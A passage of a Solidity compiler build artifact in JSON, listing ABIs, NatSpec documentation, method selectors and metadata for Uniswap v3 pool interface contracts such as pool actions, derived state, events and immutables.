							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"swap(address,bool,int256,uint160,bytes)": "128acb08"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}}},\"title\":\"Permissionless pool actions\"},\"userdoc\":{\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"}},\"notice\":\"Contains pool methods that can be called by anyone\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":\"IUniswapV3PoolActions\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							}
						},
						"notice": "Contains pool methods that can be called by anyone"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"IUniswapV3PoolDerivedState": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							}
						},
						"title": "Pool state that is not stored"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"observe(uint32[])": "883bdbfd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}}},\"title\":\"Pool state that is not stored\"},\"userdoc\":{\"methods\":{\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"}},\"notice\":\"Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs.\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":\"IUniswapV3PoolDerivedState\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							}
						},
						"notice": "Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs."
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"IUniswapV3PoolEvents": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						}
					],
					"devdoc": {
						"methods": {},
						"title": "Events emitted by a pool"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"}],\"devdoc\":{\"methods\":{},\"title\":\"Events emitted by a pool\"},\"userdoc\":{\"methods\":{},\"notice\":\"Contains all events emitted by the pool\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":\"IUniswapV3PoolEvents\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {},
						"notice": "Contains all events emitted by the pool"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"IUniswapV3PoolImmutables": {
					"abi": [
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
